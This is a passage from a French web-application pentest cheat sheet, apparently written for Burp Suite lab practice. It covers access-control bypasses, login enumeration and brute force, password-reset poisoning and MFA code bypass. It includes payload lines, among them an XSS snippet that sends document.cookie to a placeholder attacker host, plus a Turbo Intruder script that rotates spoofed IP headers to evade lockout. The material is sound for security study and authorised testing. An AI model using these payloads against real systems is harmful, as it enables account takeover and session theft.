| ACC-9 | Identifiant numérique dans l'URL | Données d'un autre utilisateur | À tester avec un compte différent ; le contrôle de propriété côté serveur l'empêche |
| ACC-10 | Identifiant lisible | Données de l'autre utilisateur | Même remarque |
| ACC-11 | Fichiers statiques à nom séquentiel | Contenu d'un autre utilisateur | Décrémenter ou incrémenter le numéro |
| ACC-12 | Identifiant dans le corps, un en-tête ou un cookie | Réponse d'un autre utilisateur | Plus d'endroits à tester |
| ACC-13 | Identifiants imprévisibles mais exposés | Identifiant de la cible trouvé dans une page publique | Chercher dans articles, commentaires et profils |
| ACC-14 | Compte d'administrateur visé | Valeur d'un champ sensible dans le HTML | La donnée peut être masquée visuellement mais présente dans le source |

```text
# ACC-9 identifiant numerique
?id=123
# ACC-9 identifiant numerique voisin
?id=124
# ACC-9 identifiant numerique
?id=1
# ACC-10 identifiant lisible
?id=<UTILISATEUR>
# ACC-11 fichier sequentiel
/download-transcript/1.txt
# ACC-14 identifiant administrateur
?id=administrator
```

Pour parcourir une plage d'identifiants, voir [[#Outils Burp - Intruder]].

### Access control - Méthode HTTP

| Réf. | Situation | Signal attendu | Remarque |
|---|---|---|---|
| ACC-15 | Règle de contrôle liée à une méthode | Passage de 401 ou 403 à 200 | Ne pas se limiter au verbe utilisé par l'interface ; une méthode alternative exige parfois un autre format de paramètre |
| ACC-16 | Frameworks qui acceptent la surcharge de méthode | Comportement de la méthode surchargée | Souvent désactivé |

```text
# ACC-15 changement de methode
GET
# ACC-15 changement de methode
POST
# ACC-15 changement de methode
PUT
# ACC-15 changement de methode
PATCH
# ACC-15 changement de methode
DELETE
# ACC-15 changement de methode
HEAD
# ACC-16 surcharge de methode
X-HTTP-Method-Override: PUT
# ACC-16 surcharge de methode parametre
_method=PUT
```

### Access control - En-têtes de réécriture

| Réf. | Situation | Signal attendu | Remarque |
|---|---|---|---|
| ACC-17 | Un front-end bloque l'URL, le serveur d'application lit l'en-tête | Réponse correspondant au chemin de l'en-tête | Envoyer la requête sur la racine ; les paramètres de requête restent dans la ligne de requête réelle |
| ACC-18 | Variante de ACC-17 | Idem | Autre implémentation |
| ACC-19 | Vérifier la prise en compte de l'en-tête | Réponse d'erreur venant de l'application | Ne prouve que la prise en compte, pas l'accès |
| ACC-20 | Règle liée à l'adresse source | Accès accordé | Généralement ignoré si non configuré |

```text
# ACC-17 reecriture url
GET /
X-Original-URL: /admin
# ACC-18 reecriture url variante
GET /
X-Rewrite-URL: /admin
# ACC-19 reecriture url test
X-Original-URL: /invalid
# ACC-20 adresse source
X-Forwarded-For: 127.0.0.1
```

### Access control - Variantes de chemin

| Réf. | Situation | Signal attendu | Remarque |
|---|---|---|---|
| ACC-21 | Règle de filtrage par correspondance exacte | Passage du refus à 200 | Dépend de la normalisation du serveur |
| ACC-22 | Action sur un chemin avec paramètre | Action exécutée | Variantes appliquées à l'adresse de l'action |

```text
# ACC-21 variante de chemin casse
/Admin
# ACC-21 variante de chemin casse
/ADMIN/deleteUser
# ACC-21 variante de chemin barre finale
/admin/
# ACC-21 variante de chemin double barre
/admin//
# ACC-21 variante de chemin extension
/admin.json
# ACC-21 variante de chemin point virgule
/admin;x
# ACC-21 variante de chemin encodage
/%61dmin
# ACC-21 variante de chemin point
/./admin
# ACC-22 variante de chemin action
/admin/deleteUser/
# ACC-22 variante de chemin action
/admin/deleteUser.anything
```

### Access control - Referer

| Réf. | Situation | Signal attendu | Remarque |
|---|---|---|---|
| ACC-23 | Contrôle fondé sur la provenance | Refus sans l'en-tête, succès avec une valeur attendue | Le serveur peut contrôler l'origine complète |

```text
# ACC-23 referer
Referer: https://<HOTE>/admin
```

## Authentication

Note détaillée : [[Authentication]] ; fiches : [[Auth-brute-force-identifiants]], [[Auth-contournement-blocage]], [[Auth-http-basic]], [[Auth-maintien-connexion]], [[Auth-reinitialisation-mot-de-passe]], [[Auth-modification-mot-de-passe]]

**Quand l'utiliser** : un formulaire de connexion, de réinitialisation ou de changement de mot de passe, ou un cookie de session persistant, est faible.
**Détection** : comparer entre un nom invalide et un mot de passe invalide la longueur, le statut, le texte, le temps de réponse et les en-têtes de réponse (Set-Cookie, Location).

### Authentication - Énumération de comptes

| Réf. | Situation | Signal attendu | Remarque |
|---|---|---|---|
| AUT-1 | Noms d'utilisateur à tester en priorité | Réponse différente pour un nom valide | Tri par longueur de réponse dans Intruder |
| AUT-2 | Réponses presque identiques | Une réponse avec une différence minime (par exemple un point final manquant) | Grep - Extract sur le message d'erreur |
| AUT-3 | Hachage exécuté seulement si le nom existe | Temps de réponse nettement plus long | Un blocage par IP est à contourner en parallèle |
| AUT-4 | Verrouillage après plusieurs essais | Message de verrouillage sur un seul nom | Cluster bomb avec Null payloads répétés 5 fois ; verrouille de vrais comptes sur une cible réelle |
| AUT-5 | Inscription ou mot de passe oublié | Message de nom déjà utilisé ou message différent | Souvent uniformisé |

```text
# AUT-1 noms a tester
admin
# AUT-1 noms a tester
administrator
# AUT-1 noms a tester
prenom.nom@domaine
# AUT-3 mot de passe tres long
<100 caracteres ou plus>
```

### Authentication - Mots de passe

| Réf. | Situation | Signal attendu | Remarque |
|---|---|---|---|
| AUT-6 | Politique de complexité | Redirection (302) pour le bon mot de passe | Mutations prévisibles ; substitutions de lettres : o par 0, a par 4, e par 3 |
| AUT-7 | Verrouillage par compte | Redirection sur un nom | Un mot de passe, plusieurs noms (password spraying) |
| AUT-8 | Corps JSON, limitation par requête | Connexion réussie en une requête | Tous les candidats dans un tableau |

```text
# AUT-6 mot de passe predictible
Password1!
# AUT-6 mot de passe predictible
Passw0rd
# AUT-6 mot de passe predictible
<MOTCLE><ANNEE>!
# AUT-8 mot de passe tableau json
"password":["123456","password","qwerty"]
```

### Authentication - Contournement de blocage

| Réf. | Situation | Signal attendu | Remarque |
|---|---|---|---|
| AUT-9 | L'adresse IP est lue dans un en-tête | Plus de blocage quand la valeur change | Ne fonctionne pas si un proxy réécrit l'en-tête |
| AUT-10 | Même cas, autres en-têtes | Idem | Si le premier est ignoré |
| AUT-11 | Compteur remis à zéro après un succès | Aucun blocage sur les essais | Alterner un identifiant valide et un candidat avec Pitchfork et une requête simultanée |

```text
# AUT-9 blocage ip en-tete
X-Forwarded-For: <IP>
# AUT-10 blocage ip en-tete
X-Real-IP: <IP>
# AUT-10 blocage ip en-tete
X-Client-IP: <IP>
# AUT-10 blocage ip en-tete
True-Client-IP: <IP>
# AUT-10 blocage ip en-tete
Forwarded: for=<IP>
# AUT-11 alternance compte valide
username=<UTILISATEUR>&password=<VALEUR>
```

Pour AUT-9, un script qui change l'adresse à chaque requête figure dans [[#Outils Burp - Turbo Intruder]]. L'alternance de AUT-11 se règle dans [[#Outils Burp - Intruder]].

### Authentication - Réinitialisation

| Réf. | Situation | Signal attendu | Remarque |
|---|---|---|---|
| AUT-12 | Lien de réinitialisation construit depuis l'en-tête | Requête de la victime dans le journal de l'exploit server, avec le jeton | Tester aussi X-Forwarded-Server et X-Host ; la victime doit cliquer |
| AUT-13 | Jeton non revalidé | La requête réussit encore | Supprimer le jeton de l'URL et du corps |
| AUT-14 | Champ d'identité modifiable dans le corps | Mot de passe de l'autre compte changé | Même famille que AUT-13 |
| AUT-15 | Changement de mot de passe avec mot de passe actuel | Un seul message différent selon le mot de passe actuel | Verrouillage si les deux nouveaux mots de passe sont identiques ; le message `New passwords do not match` n'apparaît que si le candidat est correct |
| AUT-16 | Adresse e-mail dupliquée | Lien reçu pour un autre compte | Dépend du serveur |
| AUT-17 | Génération faible du jeton | Jetons successifs proches | Demander plusieurs jetons et les comparer |

```text
# AUT-12 reinitialisation en-tete host
X-Forwarded-Host: <COLLAB>
# AUT-12 reinitialisation en-tete host
X-Forwarded-Server: <COLLAB>
# AUT-12 reinitialisation en-tete host
X-Host: <COLLAB>
# AUT-13 reinitialisation sans jeton
supprimer temp-forgot-password-token de l'URL et du corps
# AUT-15 changement mot de passe oracle
username=<UTILISATEUR>&current-password=§x§&new-password-1=123&new-password-2=abc
# AUT-16 reinitialisation email duplique
email=<VALEUR>&email=<VALEUR>
```

### Authentication - Cookie persistant

| Réf. | Situation | Signal attendu | Remarque |
|---|---|---|---|
| AUT-18 | Cookie de maintien de connexion | Structure lisible nom et condensat | Décoder en base64 ou en hexadécimal ; échoue si le cookie est signé ou aléatoire |
| AUT-19 | Forme base64 du nom et du condensat MD5 du mot de passe | Texte d'une page réservée à un utilisateur connecté | Payload processing d'Intruder : Hash MD5, Add prefix avec le nom puis deux-points, Encode Base64 ; Grep - Match sur un texte de page connectée |
| AUT-20 | XSS stocké | Requête de la victime avec le cookie dans le journal de l'exploit server | Le cookie HttpOnly bloque l'accès JavaScript ; condensat à craquer hors ligne |

```text
# AUT-19 cookie persistant forme
stay-logged-in=base64(<UTILISATEUR>:md5(<VALEUR>))
# AUT-20 vol de cookie xss
<script>document.location='//<COLLAB>/'+document.cookie</script>
```

```bash
# AUT-19 encoder
echo -n '<UTILISATEUR>:<VALEUR>' | base64
# AUT-19 decoder
echo '<VALEUR>' | base64 -d
# AUT-19 condensat md5
echo -n '<VALEUR>' | md5sum
```

### Authentication - HTTP Basic

| Réf. | Situation | Signal attendu | Remarque |
|---|---|---|---|
| AUT-21 | Réponse 401 avec l'en-tête WWW-Authenticate de type Basic | Nom et mot de passe en clair après décodage | Sans HTTPS ni HSTS, interception possible |
| AUT-22 | Force brute de l'en-tête | 200 au lieu de 401 | Intruder avec Encode Base64 ; limitation ou blocage par IP possibles |

```text
# AUT-21 http basic
Authorization: Basic base64(<UTILISATEUR>:<VALEUR>)
```

## Multi-factor authentication

Note détaillée : [[Multi-factor-authentication]] ; fiches : [[MFA-acces-direct]], [[MFA-logique-defaillante]], [[MFA-brute-force-code]], [[MFA-reponse-et-secours]]

**Quand l'utiliser** : une connexion exige un second facteur (code à usage unique) après le mot de passe.
**Détection** : après la première étape, tester l'accès direct à une page réservée, regarder si l'identité est portée par un cookie modifiable, puis mesurer la limitation des essais du code.

### Multi-factor authentication - Contournement de l'étape

| Réf. | Situation | Signal attendu | Remarque |
|---|---|---|---|
| MFA-1 | Session déjà considérée comme connectée après l'étape 1 | Page de compte affichée | Naviguer vers l'URL réservée sans jamais soumettre le code |
| MFA-2 | Identité portée par un cookie entre les deux étapes | Le code est généré pour le compte visé, puis la redirection 302 suit le bon code | Le cookie de liaison d'identité s'appelle `verify` ; la limitation d'essais et la durée de vie du code restreignent l'attaque |
| MFA-3 | Flux parallèles : réinitialisation, OAuth, API mobile | Session ouverte sans code | Dépend de l'application |

```text
# MFA-1 acces direct apres etape 1
/my-account
# MFA-2 identite par cookie generation du code
GET /login2
Cookie: verify=<UTILISATEUR>
# MFA-2 identite par cookie soumission du code
POST /login2
Cookie: verify=<UTILISATEUR>
```

### Multi-factor authentication - Force brute du code

| Réf. | Situation | Signal attendu | Remarque |
|---|---|---|---|
| MFA-4 | Code à quatre ou six chiffres | Redirection (302) sur le bon code | Intruder, attaque Sniper, payload de type Numbers ; plusieurs passes peuvent être nécessaires |
| MFA-5 | La session est coupée après deux échecs | Idem | Macro de connexion et règle de gestion de session, avec une requête simultanée (voir l'annexe) |

```text
# MFA-4 force brute code quatre chiffres
0000-9999
# MFA-4 force brute code six chiffres
000000-999999
# MFA-5 force brute parametre du code
mfa-code=§0000§
```

Pour MFA-5, voir [[#Outils Burp - Resource pool et sessions]].

### Multi-factor authentication - Réponse manipulable

| Réf. | Situation | Signal attendu | Remarque |
|---|---|---|---|
| MFA-6 | La décision est prise côté client | Accès accordé | Surveiller la réponse de vérification ; rare |
| MFA-7 | Mécanismes de secours | Accès sans code | Codes de secours, cookie de confiance de l'appareil |

La valeur d'origine de la réponse est `"verified":false` ; la valeur à essayer est la suivante.

```text
# MFA-6 reponse de verification
"verified":true
```

## Outils Burp transverses

Les réglages d'outil sont rassemblés ici ; les thèmes ci-dessus y renvoient. Gabarit identique, sans colonne de moteur.

**Quand l'utiliser** : pour automatiser un test d'un thème (énumération, force brute, mesure de délai, relevé d'interactions).
**Détection** : sans objet, voir le thème concerné.

### Outils Burp - Intruder

| Réf. | Outil | Usage | Remarque |
|---|---|---|---|
| BRP-1 | Positions | Marquer la valeur à faire varier entre deux paragraphes | Le format de la marque est `§X§` |
| BRP-2 | Sniper | Une position, une liste | Mots de passe d'un compte, numéros d'identifiant |
| BRP-3 | Pitchfork | Deux listes alignées | En-tête de substitution d'adresse IP et candidat ; alternance d'un compte valide et d'un essai (avec une requête simultanée) |
| BRP-4 | Cluster bomb | Toutes les combinaisons | Verrouillage de compte avec Null payloads répétés ; index et caractère en injection aveugle |
| BRP-5 | Payload processing | Transformer chaque candidat avant l'envoi | Hash MD5, Add prefix, Encode Base64 pour un cookie persistant |
| BRP-6 | Grep - Match | Repérer un texte dans chaque réponse | Message de réussite en injection aveugle, texte d'une page connectée |
| BRP-7 | Grep - Extract | Extraire un fragment du message d'erreur | Différences subtiles entre deux messages |
| BRP-8 | Liste de payloads dédiée | Fuzzing - path traversal | Liste intégrée de Burp pour la traversée de chemin |
| BRP-9 | Payload Numbers | Séquence de nombres | Octet de 1 à 255 pour un balayage, code à quatre chiffres |

### Outils Burp - Turbo Intruder

| Réf. | Outil | Usage | Remarque |
|---|---|---|---|
| BRP-10 | Script de changement d'adresse | Contournement de blocage par IP | Un seul marqueur de position sur le mot de passe ; l'adresse remplace une valeur de substitution dans la requête de base |

```python
# BRP-10 turbo intruder adresse ip aleatoire
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                            concurrentConnections=1,
                            requestsPerConnection=1,
                            pipeline=False
                            )

    for password in wordlists.clipboard:
        ip = "%d.%d.%d.%d" % (
            randint(1, 255), randint(1, 255), randint(1, 255), randint(1, 255)
        )
        req = target.req.replace("1.1.1.1", ip)
        engine.queue(req, password)


def handleResponse(req, interesting):
    table.add(req)
```

### Outils Burp - Collaborator

| Réf. | Outil | Usage | Remarque |
|---|---|---|---|
| BRP-11 | Collaborator | Obtenir un sous-domaine d'interaction pour `<COLLAB>` | Nécessite Burp Suite Professional |
| BRP-12 | Poll now | Relever les interactions DNS et HTTP reçues | Attendre un court délai après l'envoi ; un DNS seul peut venir d'un résolveur intermédiaire |
| BRP-13 | Exploit server | Domaine alternatif pour `<COLLAB>` et journal d'accès | Sert à lire les requêtes de la victime, par exemple un jeton ou un cookie |

### Outils Burp - Resource pool et sessions

| Réf. | Outil | Usage | Remarque |
|---|---|---|---|
| BRP-14 | Resource pool | Limiter à une requête simultanée | Délais mesurés, alternance de compte, macro de session |
| BRP-15 | Macro | Rejouer les étapes de connexion avant chaque essai | Par exemple une requête GET de la page de connexion, un POST de connexion, un GET de la page du code |
| BRP-16 | Règle de gestion de session | Lancer la macro avant chaque requête de l'attaque | Utile quand la session est coupée après quelques échecs |
| BRP-17 | Filtre Images de l'historique du proxy | Retrouver l'adresse de service des fichiers téléversés | Onglet HTTP history du proxy |
